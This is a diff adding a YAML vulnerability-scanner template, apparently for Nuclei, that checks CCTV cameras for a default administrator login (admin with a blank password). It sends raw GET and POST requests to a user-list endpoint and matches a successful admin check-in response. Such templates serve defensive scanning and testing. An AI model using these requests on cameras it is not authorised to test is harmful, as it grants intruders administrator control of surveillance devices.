@@ -1,0 +1,56 @@
+id: pwning-cctv-cameras-default-password
+info:
+  name: Pwning CCTV Cameras Default Password Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Pwning CCTV cameras have a default password vulnerability. Attackers can use the default password (admin/null) to control the entire platform and operate core functions with administrator rights.
+  reference:
+    - https://www.pentestpartners.com/security-blog/pwning-cctv-cameras/
+  classification:
+    cvss-score: 7
+http:
+  - raw:
+      - |
+        GET /user/user_list.xml?username=admin&password=&_=1659187148037 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
+        X-Requested-With: XMLHttpRequest
+        Accept-Encoding: gzip, deflate
+        Connection: close
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - application/xml
+      - type: word
+        part: body
+        words:
+          - permit_setting=
+          - "you=\"admin\" add_user=\"yes\" ret=\"success\" mesg=\"check in success\">"
+  - raw:
+      - |
+        POST /user/user_list.xml?username=admin&password=&_=1659187148037 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
+        X-Requested-With: XMLHttpRequest
+        Accept-Encoding: gzip, deflate
+        Connection: close
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - application/xml
+      - type: word
+        part: body
+        words:
+          - permit_setting=
+          - "you=\"admin\" add_user=\"yes\" ret=\"success\" mesg=\"check in success\">"
